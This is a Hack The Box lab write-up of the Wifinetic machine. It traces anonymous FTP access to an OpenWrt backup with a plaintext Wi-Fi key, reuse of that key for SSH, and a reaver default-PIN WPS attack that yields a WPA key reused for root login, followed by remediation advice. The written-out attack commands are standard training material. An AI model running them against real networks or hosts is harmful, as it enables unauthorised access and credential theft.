---
title: "Wifinetic — Backup-Exposed Wi-Fi Key Reuse and a Default-PIN WPS Attack"
description: "Anonymous FTP exposes an OpenWrt backup containing a wireless key reused for SSH access; a raw-packet-capable reaver and a default WPS PIN recover a WPA key that grants root SSH."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - wifi
  - wps
  - credential-reuse
  - capabilities
objective: "Chain an exposed OpenWrt backup and an over-privileged wireless tool to move from anonymous FTP access to user- and root-level SSH access."
tools:
  - nmap
  - wget
  - tar
  - sshpass
  - getcap
  - reaver
skill: "Wireless credential recovery and cross-service credential reuse"
outcome: "User-level SSH access via a leaked Wi-Fi PSK, then root SSH access via a WPS-recovered WPA PSK"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux host (OpenSSH 8.2p1 on Ubuntu) with an emulated wireless stack (`mac80211_hwsim`) |
| Starting position | Unauthenticated network access |
| Objective | Chain an exposed OpenWrt backup and an over-privileged wireless tool to move from anonymous FTP access to user- and root-level SSH access |
| Outcome | User-level SSH access via a leaked Wi-Fi PSK, then root SSH access via a WPS-recovered WPA PSK |

## Backup key reuse and WPS recovery

Wifinetic is an Easy-rated Hack The Box Linux lab that reaches full compromise through configuration exposure and credential reuse. Anonymous FTP serves an OpenWrt configuration backup whose wireless stanza stores the Wi-Fi pre-shared key in plaintext, and that same value is also the network-administrator SSH password. On the host, the wireless audit tool `reaver` carries `cap_net_raw+ep`, so an unprivileged user can run a WPS attack against the local access point, recover a second WPA key from a factory-default PIN, and reuse it to log in as root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Anonymous FTP → OpenWrt backup disclosure → Wi-Fi PSK reused for user SSH → raw-packet-capable `reaver` → default-PIN WPS attack → WPA PSK recovered → reused for root SSH**

## Linux host with an emulated wireless stack, anonymous FTP start

- **Target:** an Easy-rated Linux lab host exposing FTP (21), SSH (22), and DNS (53).
- **Environment:** the host runs an emulated wireless stack (`mac80211_hwsim`) that presents an access-point interface, a managed client, and a monitor interface.
- **Starting position:** unauthenticated network access; the FTP service allows anonymous login and is the entry point, while SSH is the interactive service the recovered keys target.
- **Objective:** follow the exposed backup and wireless path from anonymous access to user- and root-level SSH access.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: anonymous FTP backup, reused PSK, and WPS

### 1. Service Enumeration

Observation: a targeted version and default-script scan exposed three services.

```bash
nmap -sV -sC -p21,22,53 <TARGET_IP>
```

```text
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu
53/tcp open  dns        tcpwrapped
```

Significance: FTP allows anonymous access and is the only unauthenticated data service, so it is the natural entry point. SSH is the shell endpoint the recovered keys target.

Result: the target exposes three services, with FTP as the initial access surface.

### 2. Anonymous FTP Backup Disclosure

Observation: anonymous FTP exposes an OpenWrt configuration backup whose wireless configuration is readable.

```bash
wget -r ftp://anonymous:anonymous@<TARGET_IP>/
tar -xvf backup-OpenWrt-2023-07-26.tar
cat etc/config/wireless
```

```text
config wifi-iface '<WIRELESS_INTERFACE>'
       option device 'radio0'
       option mode 'ap'
       option ssid '<SSID>'
       option encryption 'psk'
       option key '<ARCHIVE_WIFI_PSK>'
```

Significance: the backup stores the Wi-Fi pre-shared key in plaintext, and wireless configuration backups routinely capture credential material, so an anonymously reachable file service can leak secrets. The archive also included an `/etc/passwd` file with an entry for the network-administrator account.

Result: a plaintext Wi-Fi PSK is recovered from the anonymous backup.

### 3. SSH Credential Reuse

Observation: I checked the value recovered from the backup against the account's SSH login, and it authenticated.

```bash
sshpass -p '<ARCHIVE_WIFI_PSK>' ssh <LAB_USER>@<TARGET_IP>
```

```text
uid=1000(<LAB_USER>) gid=1000(<LAB_USER>) groups=1000(<LAB_USER>)
```

Significance: reusing the wireless secret as an account password collapsed two trust boundaries into one, so a leaked configuration value granted interactive host access.

Result: authenticated user-level SSH access.

### 4. Wireless Capability Review

Observation: the wireless audit tool `reaver` is installed. The source describes a virtualized wireless environment (`mac80211_hwsim`) with an access-point interface, a managed client, and a monitor interface.

```bash
getcap /usr/bin/reaver
```

```text
/usr/bin/reaver = cap_net_raw+ep
```

Significance: `cap_net_raw+ep` grants raw packet access without SUID or root, so any local user can inject and capture 802.11 frames with `reaver`. This is a privilege grant that overlaps conventional SUID auditing.

Result: the unprivileged user can use `reaver` with raw-socket capability.

### 5. WPS Recovery and Root SSH Reuse

Observation: the emulated access point accepts its factory-default WPS PIN.

```bash
reaver -i <MONITOR_INTERFACE> -b <AP_BSSID> -vv
```

```text
[+] Trying pin "12345670"
[+] Associated with <AP_BSSID> (ESSID: <SSID>)
[+] Pin cracked in 1 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: '<RECOVERED_WPA_PSK>'
```

Significance: a default WPS PIN reduces the WPA2 handshake to a single known guess, and the recovered key is distinct from the one leaked by the backup.

Result: the WPA PSK is recovered.

The recovered key then logs in as root:

```bash
sshpass -p '<RECOVERED_WPA_PSK>' ssh root@<TARGET_IP>
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Significance: reuse of the recovered wireless key as the root password means a wireless secret granted full host control.

Result: authenticated root-level SSH access.

## Challenges and Decisions

No failed attempts, obstacles, or tradeoffs are documented for this path.

## Outcome: user SSH from leaked key and WPS root

Recorded session identity output confirms user-level SSH access from the Wi-Fi key leaked by the anonymous OpenWrt backup and root-level SSH access from the WPA key recovered through the WPS attack. DNS stayed enumeration-only; I could not verify any exploitation path through it.

## Recommendations: anonymous backups, credential reuse, raw-packet capability, and default WPS

The observed access paths inform these recommendations, which were not tested during the exercise.

Each finding below pairs the observed root cause with its demonstrated impact and a prioritized action.

1. **Anonymous exposure of configuration backups.** The backup stored the Wi-Fi pre-shared key in plaintext and was reachable without authentication, so a routine backup became a credential leak. *Recommendation:* require authentication for file services, keep configuration and backup archives off anonymously reachable paths, and encrypt credential-bearing backups. *Detection:* alert when anonymous logins occur or backup and configuration artifacts are transferred.
2. **Cross-service credential reuse.** The wireless pre-shared key and the WPA key each also doubled as an SSH password, for the network-administrator and root accounts respectively, so a single wireless secret became full host control. *Recommendation:* never reuse wireless keys as account passwords, and store infrastructure and account secrets separately in a managed secret store.
3. **Raw-packet file capability.** `reaver` carried `cap_net_raw+ep`, so an unprivileged user could inject and capture 802.11 frames without SUID or root. *Recommendation:* audit file capabilities alongside SUID/SGID permissions, and restrict wireless tooling that needs raw sockets to privileged or dedicated accounts. *Detection:* alert when `cap_net_raw` or `cap_net_admin` is granted to a user-invokable binary.
4. **WPS enabled with a default PIN.** The access point accepted its factory-default WPS PIN, which reduced WPA2 to a single known guess. *Recommendation:* disable WPS where it is not required; where it must remain, enforce a unique PIN and monitor for repeated WPS attempts.

## References

- [Hack The Box — Wifinetic](https://app.hackthebox.com/machines/Wifinetic) (retired machine)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
- [Reaver — WPS attack tool (project repository)](https://github.com/t6x/reaver-wps-fork-t6x)
- [Wi-Fi Protected Setup — Wi-Fi Alliance](https://www.wi-fi.org/discover-wi-fi/wi-fi-protected-setup)
- [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [GNU tar Manual](https://www.gnu.org/software/tar/manual/tar.html)
